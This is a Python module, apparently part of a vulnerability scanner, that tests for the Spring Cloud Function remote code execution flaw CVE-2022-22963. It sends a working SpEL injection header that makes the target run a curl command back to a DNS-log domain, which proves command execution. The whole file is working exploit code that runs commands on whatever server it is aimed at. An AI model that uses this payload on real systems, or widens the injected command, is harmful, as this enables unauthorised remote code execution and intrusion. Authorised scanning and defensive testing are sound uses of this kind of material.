#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     cve_2022_22963.py
   Description :
   Author :       sule01u
   date：          2023/10/8
"""
import requests
import random
from urllib.parse import urljoin
from utils.custom_headers import USER_AGENTS, TIMEOUT
from colorama import Fore
from utils.logging_config import configure_logger
logger = configure_logger(__name__)
requests.packages.urllib3.disable_warnings()

CVE_ID = "CVE-2022-22963"


def check(url, dns_domain, proxies=None):
    """
    对给定的目标URL检测CVE-2022-22963漏洞。
    参数:
    - target_url: 待检测的目标URL
    - proxies: 代理配置
    """
    dns_domain = dns_domain or "dnslog.cn"
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': random.choice(USER_AGENTS),
        'Content-Type': 'application/x-www-form-urlencoded',
        'spring.cloud.function.routing-expression': 'T(java.lang.Runtime).getRuntime().exec("curl SBSCAN_cve_2022_22963.%s")' % dns_domain
    }
    # 构建请求URL
    target_url = urljoin(url, "/functionRouter")
    try:
        res = requests.post(target_url, headers=headers, data='test', verify=False, timeout=TIMEOUT, proxies=proxies)
        logger.debug(Fore.CYAN + f"[{res.status_code}]" + Fore.BLUE + f"[{res.headers}]", extra={"target": target_url})
        # 检查响应内容来判断漏洞是否存在
        if res.status_code == 500 and '"error":"Internal Server Error"' in res.text:
            details = f"可能存在{CVE_ID}[无回显漏洞]的RCE漏洞"
            if dns_domain == "dnslog.cn":
                details += "，建议使用--dnslog参数指定你的dnslog域名后再次扫描"
            else:
                details += "，请查看你的dnslog确认"

            logger.info(Fore.RED + f"[{CVE_ID} vulnerability detected!]", extra={"target": target_url})
            return True, {
                "CVE_ID": CVE_ID,
                "URL": target_url,
                "Details": details
            }
        logger.info(f"[{CVE_ID} vulnerability not detected]", extra={"target": url})
        return False, {}
    except requests.RequestException as e:
        logger.debug(f"[Request Error：{e}]", extra={"target": target_url})
        return False, {}
    except Exception as e:
        logger.error(f"[Unknown Error：{e}]", extra={"target": target_url})
        return False, {}


if __name__ == "__main__":
    is_vul, res = check("http://localhost:8081/", "5pugcrp1.eyes.sh", proxies={})
    print(is_vul, res)
